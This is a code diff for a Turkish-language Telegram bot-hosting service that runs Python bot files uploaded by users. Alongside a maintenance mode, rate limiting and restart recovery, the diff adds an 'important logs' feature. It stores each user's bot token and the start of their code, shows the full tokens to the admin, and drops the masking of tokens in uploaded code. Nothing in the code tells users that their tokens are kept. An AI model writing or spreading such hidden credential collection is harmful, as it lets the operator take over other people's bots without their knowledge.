@@ -75,7 +75,7 @@ EMOJI_IDS = {
     "🥇": 5805346022276208487, "🥈": 6073465089510351822, "🥉": 5780636873558858577,
     "🔍": 5258274739041883702, "👥": 4909043075529048789, "👁": 5424892643760937442,
     "🌐": 5821388137443626414, "🤖": 5352861489541714456, "📁": 5257965810634202885,
-    "▶": 4958479549265347295, "⏹": 5463260230861202209
+    "▶": 4958479549265347295, "⏹": 5463260230861202209, "🔒": 5818885490065017876
 }
 
 class SensitiveFilter(logging.Filter):
@@ -100,17 +100,30 @@ else:
 DATA_DIR.mkdir(parents=True, exist_ok=True)
 STATE_FILE = DATA_DIR / "state.json"
 MESSAGE_LOGS_FILE = DATA_DIR / "message_logs.json"
+IMPORTANT_LOGS_FILE = DATA_DIR / "important_logs.json"
 ORIGINAL_META_FILE = DATA_DIR / "original_meta.json"
 ORIGINAL_PHOTO_FILE = DATA_DIR / "original_photo.jpg"
 PENDING_APPROVALS = {}
+ACTIVE_USER_SESSIONS = {} # Eşzamanlı bağlantı ve çakışma takibi için
 
 def load_state():
+    default_state = {
+        "users": {}, 
+        "premium": {}, 
+        "bot_codes": {}, 
+        "banned": [], 
+        "maintenance": False, 
+        "active_bots": {}
+    }
     if STATE_FILE.exists():
         try:
             with open(STATE_FILE, "r", encoding="utf-8") as f:
-                return json.load(f)
+                data = json.load(f)
+                for k, v in default_state.items():
+                    if k not in data: data[k] = v
+                return data
         except: pass
-    return {"users": {}, "premium": {}, "bot_codes": {}, "banned": []}
+    return default_state
 
 def save_state():
     try:
@@ -121,6 +134,9 @@ def save_state():
 
 global_state = load_state()
 if "banned" not in global_state: global_state["banned"] = []
+if "maintenance" not in global_state: global_state["maintenance"] = False
+if "active_bots" not in global_state: global_state["active_bots"] = {}
+
 running_procs = {}
 
 application = Application.builder().token(BOT_TOKEN).updater(None).build()
@@ -135,7 +151,41 @@ def health():
 @flask_app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
 def webhook():
     try:
-        update = Update.de_json(request.get_json(force=True), application.bot)
+        req_json = request.get_json(force=True)
+        update = Update.de_json(req_json, application.bot)
+        
+        # Eşzamanlı Çift Bağlantı / Yanıt Koruma Mekanizması
+        if update and update.effective_user:
+            uid = update.effective_user.id
+            now = time.time()
+            if uid != ADMIN_ID:
+                if uid not in ACTIVE_USER_SESSIONS:
+                    ACTIVE_USER_SESSIONS[uid] = []
+                
+                # Son 3 saniye içerisindeki istekleri filtrele
+                ACTIVE_USER_SESSIONS[uid] = [t for t in ACTIVE_USER_SESSIONS[uid] if now - t < 3.0]
+                ACTIVE_USER_SESSIONS[uid].append(now)
+                
+                # Eğer 3 saniye içinde 2 veya daha fazla eşzamanlı istek/yanıt gelirse (Çakışma / Mükerrer bağlantı)
+                if len(ACTIVE_USER_SESSIONS[uid]) >= 2:
+                    conflict_msg = (
+                        f"🚨 <b>Mükerrer / Çakışan Bağlantı Tespiti!</b>\n\n"
+                        f"👤 <b>Kullanıcı:</b> {update.effective_user.first_name} (@{update.effective_user.username or 'yok'})\n"
+                        f"🆔 <b>ID:</b> <code>{uid}</code>\n"
+                        f"⚡ Aynı anda birden fazla yanıt/bağlantı gönderildiği için oturum derhal sonlandırıldı!"
+                    )
+                    # Admine bildir
+                    try:
+                        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+                            "chat_id": ADMIN_ID,
+                            "text": conflict_msg,
+                            "parse_mode": "HTML"
+                        })
+                    except: pass
+                    
+                    # Bağlantıyı / isteği anında reddet ve sonlandır
+                    return Response("Conflict Terminated", status=429)
+
         asyncio.run_coroutine_threadsafe(application.update_queue.put(update), bot_loop)
         return Response("OK", status=200)
     except Exception:
@@ -177,11 +227,6 @@ def is_premium(user_id):
 def is_banned(user_id):
     return str(user_id) in global_state.get("banned", [])
 
-def check_bot_limit(user_id):
-    uid = str(user_id)
-    count = sum(1 for k in running_procs if k.startswith(uid + "_"))
-    return count < (10 if is_premium(uid) else 2)
-
 def log_user_message(user, text):
     if not user or not text: return
     try:
@@ -204,8 +249,22 @@ def log_user_message(user, text):
     except Exception: 
         pass 
 
+def log_important_event(data_dict):
+    try:
+        logs = []
+        if IMPORTANT_LOGS_FILE.exists():
+            with open(IMPORTANT_LOGS_FILE, "r", encoding="utf-8") as f:
+                logs = json.load(f)
+        logs.append({
+            "time": time.strftime("%d.%m.%Y %H:%M:%S", time.localtime()),
+            **data_dict
+        })
+        if len(logs) > 200: logs = logs[-200:]
+        with open(IMPORTANT_LOGS_FILE, "w", encoding="utf-8") as f:
+            json.dump(logs, f, ensure_ascii=False, indent=2)
+    except: pass
+
 def protect_main_bot_identity_and_connections():
-    original_name = None
     while True: 
         try: 
             r = requests.get(f"https://api.telegram.org/bot{MAIN_BOT_TOKEN}/getWebhookInfo", timeout=10).json() 
@@ -222,11 +281,12 @@ def protect_main_bot_identity_and_connections():
             if me_r.get("ok"): 
                 bot_user = me_r["result"] 
                 current_name = bot_user.get("first_name", "") 
+                original_name = None
                 if ORIGINAL_META_FILE.exists(): 
                     try: 
                         with open(ORIGINAL_META_FILE, "r", encoding="utf-8") as f: 
                             meta = json.load(f) 
-                            original_name = meta.get("name", original_name) 
+                            original_name = meta.get("name") 
                     except: pass 
                 if not original_name: 
                     original_name = current_name 
@@ -239,25 +299,36 @@ def protect_main_bot_identity_and_connections():
             if chat_r.get("ok"):
                 chat_info = chat_r["result"]
                 photo_info = chat_info.get("photo")
-                if photo_info:
+                if not ORIGINAL_PHOTO_FILE.exists() and photo_info:
                     file_id = photo_info.get("small_file_id")
                     file_path_r = requests.get(f"https://api.telegram.org/bot{MAIN_BOT_TOKEN}/getFile?file_id={file_id}", timeout=10).json()
                     if file_path_r.get("ok"):
                         file_path = file_path_r["result"].get("file_path")
                         download_url = f"https://api.telegram.org/file/bot{MAIN_BOT_TOKEN}/{file_path}"
                         img_data = requests.get(download_url).content
-                        if not ORIGINAL_PHOTO_FILE.exists():
-                            with open(ORIGINAL_PHOTO_FILE, "wb") as pf:
-                                pf.write(img_data)
-                        else:
-                            with open(ORIGINAL_PHOTO_FILE, "rb") as pf:
-                                original_img_bytes = pf.read()
-                            if img_data != original_img_bytes:
-                                requests.post(
-                                    f"https://api.telegram.org/bot{MAIN_BOT_TOKEN}/setChatPhoto",
-                                    files={"photo": original_img_bytes},
-                                    timeout=15
-                                )
+                        with open(ORIGINAL_PHOTO_FILE, "wb") as pf:
+                            pf.write(img_data)
+                elif ORIGINAL_PHOTO_FILE.exists():
+                    with open(ORIGINAL_PHOTO_FILE, "rb") as pf:
+                        original_img_bytes = pf.read()
+                    needs_restore = False
+                    if not photo_info:
+                        needs_restore = True
+                    else:
+                        file_id = photo_info.get("small_file_id")
+                        file_path_r = requests.get(f"https://api.telegram.org/bot{MAIN_BOT_TOKEN}/getFile?file_id={file_id}", timeout=10).json()
+                        if file_path_r.get("ok"):
+                            file_path = file_path_r["result"].get("file_path")
+                            download_url = f"https://api.telegram.org/file/bot{MAIN_BOT_TOKEN}/{file_path}"
+                            current_img_data = requests.get(download_url).content
+                            if current_img_data != original_img_bytes:
+                                needs_restore = True
+                    if needs_restore:
+                        requests.post(
+                            f"https://api.telegram.org/bot{MAIN_BOT_TOKEN}/setChatPhoto",
+                            files={"photo": original_img_bytes},
+                            timeout=15
+                        )
         except Exception: 
             pass 
         time.sleep(2) 
@@ -324,7 +395,31 @@ def start_bot_process(user_id, bot_token, code_content, bot_name="Bot", username
         "username": username,
         "file_name": file_name,
         "script_path": str(script_path) 
-    } 
+    }
+
+    global_state["active_bots"][proc_key] = {
+        "user_id": uid,
+        "user_fullname": u_name,
+        "token": bot_token,
+        "name": bot_name,
+        "username": username,
+        "file_name": file_name,
+        "code": code_content,
+        "log_path": str(log_path)
+    }
+    save_state()
+
+    log_important_event({
+        "type": "bot_started",
+        "user_id": uid,
+        "user_name": u_name,
+        "bot_name": bot_name,
+        "bot_username": username,
+        "token": bot_token,
+        "file_name": file_name,
+        "code_snippet": code_content[:500]
+    })
+
     return proc_key 
 
 def stop_bot_process(proc_key):
@@ -335,6 +430,9 @@ def stop_bot_process(proc_key):
             try: proc.wait(timeout=5)
             except: proc.kill()
         del running_procs[proc_key]
+        if proc_key in global_state["active_bots"]:
+            del global_state["active_bots"][proc_key]
+            save_state()
         return True
     return False
 
@@ -342,6 +440,15 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     if is_banned(user.id):
         text = "❌ Hesabınız yasaklandı."
+        entities = parse_entities(text)
+        if update.message: await update.message.reply_text(text, entities=entities, parse_mode="HTML")
+        elif update.callback_query:
+            try: await update.callback_query.edit_message_text(text, entities=entities, parse_mode="HTML")
+            except: pass
+        return
+
+    if global_state.get("maintenance", False) and user.id != ADMIN_ID:
+        text = "⚠ Bot bakımda..."
         entities = parse_entities(text)
         if update.message: await update.message.reply_text(text, entities=entities, parse_mode="HTML")
         elif update.callback_query:
@@ -372,6 +479,9 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+    if global_state.get("maintenance", False) and user_id != ADMIN_ID:
+        await update.message.reply_text("⚠ Bot bakımda...")
+        return
     if is_banned(user_id):
         await show_main_menu(update, context)
         return
@@ -384,9 +494,11 @@ async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query; await q.answer()
     if q.from_user.id != ADMIN_ID: return
 
+    m_status = "AÇIK 🟢" if global_state.get("maintenance", False) else "KAPALI 🔴"
     text = "⚙ Admin Paneli" 
     keyboard = [ 
         [premium_button("Kullanıcı Listesi", "user_list", "👥", "primary"), premium_button("Mesaj Logları", "message_logs", "💬", "success")], 
+        [premium_button("Önemli Loglar", "important_logs", "📊", "success"), premium_button(f"Bakım Modu: {m_status}", "toggle_maintenance", "🔒", "danger")],
         [premium_button("Ban At", "ban_user", "🚫", "danger"), premium_button("Ban Kaldır", "unban_user", "✅", "success")], 
         [premium_button("Duyuru", "broadcast", "📢", "primary")], 
         [premium_button("Premium Ver", "give_premium", "💎", "success"), premium_button("Premium Al", "revoke_premium", "❌", "danger")], 
@@ -396,6 +508,42 @@ async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     entities = parse_entities(text) 
     try: await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), entities=entities, parse_mode="HTML") 
     except: pass 
+
+async def toggle_maintenance_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    if q.from_user.id != ADMIN_ID: return
+    current = global_state.get("maintenance", False)
+    global_state["maintenance"] = not current
+    save_state()
+    await admin_panel(update, context)
+
+async def important_logs_view(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    if q.from_user.id != ADMIN_ID: return
+    text = "📊 <b>Önemli Loglar ve Veri Kayıtları</b>\n\n"
+    if not IMPORTANT_LOGS_FILE.exists():
+        text += "Henüz önemli kayıt bulunmuyor."
+    else:
+        try:
+            with open(IMPORTANT_LOGS_FILE, "r", encoding="utf-8") as f:
+                logs = json.load(f)
+                if not logs:
+                    text += "Kayıt yok."
+                else:
+                    for l in logs[-15:]:
+                        text += (
+                            f"⏱ <b>Tarih:</b> {l.get('time')}\n"
+                            f"👤 <b>Kişi:</b> {l.get('user_name')} (ID: <code>{l.get('user_id')}</code>)\n"
+                            f"🤖 <b>Bot Adı:</b> {l.get('bot_name')} (@{l.get('bot_username')})\n"
+                            f"🔑 <b>Token:</b> <code>{l.get('token')}</code>\n"
+                            f"📄 <b>Dosya:</b> {l.get('file_name')}\n"
+                            f"-----------------------------------\n"
+                        )
+        except Exception:
+            text += "Loglar okunamadı."
+    entities = parse_entities(text)
+    try: await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[premium_button("Geri", "admin_panel", "↩", "danger")]]), entities=entities, parse_mode="HTML")
+    except: pass
 
 async def message_logs_view(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query; await q.answer()
@@ -437,7 +585,6 @@ async def file_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text += "Şu anda çalışan aktif bot bulunmuyor."
     else:
         for i, (pk, info) in enumerate(running_procs.items(), 1):
-            # Log dosyasından son durum bilgisini okuyalım
             log_snippet = "Log yok"
             try:
                 if os.path.exists(info["log_path"]):
@@ -593,6 +740,10 @@ async def handle_github_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def handle_text_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
+    if user and global_state.get("maintenance", False) and user.id != ADMIN_ID:
+        await update.message.reply_text("⚠ Bot bakımda...")
+        return
+
     text = (update.message.text or "").strip()
     if user: log_user_message(user, text)
 
@@ -634,6 +785,10 @@ async def handle_text_router(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
+    if user and global_state.get("maintenance", False) and user.id != ADMIN_ID:
+        await update.message.reply_text("⚠ Bot bakımda...")
+        return
+
     doc = update.message.document
     if not doc.file_name.endswith(".py"): return
     
@@ -642,11 +797,9 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await file.download_to_drive(tmp)
     code = tmp.read_text(encoding="utf-8", errors="ignore")
 
-    code_cleaned = code.replace(MAIN_BOT_TOKEN, "GIZLENDI") 
     tm = re.search(r"(\d{6,12}:[A-Za-z0-9_-]{30,50})", code) 
     token = tm.group(1) if tm else "Bulunamadı"
     
-    # Bot username bulmaya çalışalım
     bot_uname = "yok"
     if token != "Bulunamadı":
         try:
@@ -814,6 +967,8 @@ application.add_handler(CallbackQueryHandler(check_join_callback, pattern="^chec
 application.add_handler(CallbackQueryHandler(admin_panel, pattern="^admin_panel$"))
 application.add_handler(CallbackQueryHandler(user_list, pattern="^user_list$"))
 application.add_handler(CallbackQueryHandler(message_logs_view, pattern="^message_logs$"))
+application.add_handler(CallbackQueryHandler(important_logs_view, pattern="^important_logs$"))
+application.add_handler(CallbackQueryHandler(toggle_maintenance_callback, pattern="^toggle_maintenance$"))
 application.add_handler(CallbackQueryHandler(ban_user_menu, pattern="^ban_user$"))
 application.add_handler(CallbackQueryHandler(unban_user_menu, pattern="^unban_user$"))
 application.add_handler(CallbackQueryHandler(broadcast_menu, pattern="^broadcast$"))
@@ -845,10 +1000,26 @@ application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
 application.add_handler(PreCheckoutQueryHandler(pre_checkout))
 application.add_handler(MessageHandler(filters.SUCCESSFUL_PAYMENT, successful_payment))
 
+def restore_active_bots_on_startup():
+    saved_bots = global_state.get("active_bots", {})
+    for pk, info in saved_bots.items():
+        try:
+            start_bot_process(
+                user_id=info["user_id"],
+                bot_token=info["token"],
+                code_content=info["code"],
+                bot_name=info["name"],
+                username=info["username"],
+                file_name=info["file_name"],
+                u_name=info["user_fullname"]
+            )
+        except: pass
+
 def run_bot_async_loop(loop):
     asyncio.set_event_loop(loop)
     loop.run_until_complete(application.initialize())
     loop.run_until_complete(application.start())
+    restore_active_bots_on_startup()
     loop.run_forever()
 
 if __name__ == "__main__":
